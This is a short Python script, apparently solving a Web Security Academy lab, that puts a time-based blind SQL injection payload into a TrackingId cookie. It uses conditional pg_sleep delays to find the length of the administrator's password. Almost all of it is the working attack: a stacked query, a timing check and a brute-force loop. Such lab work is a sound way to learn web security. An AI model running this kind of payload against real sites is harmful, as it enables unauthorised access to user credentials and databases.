import requests

url = "https://0ad300c503da1d9cc00e271b00ad00e6.web-security-academy.net/"

for i in range(1, 30):
    cookies = {"TrackingId":"TrackingId=TrackingId=Bo6DofnwE7hELTVL'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>"+str(i)+")+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--"}

    r = requests.get(url, cookies=cookies)

    if r.elapsed.total_seconds() < 2:
        print("O tamanho da senha e: " + str(i))
        break

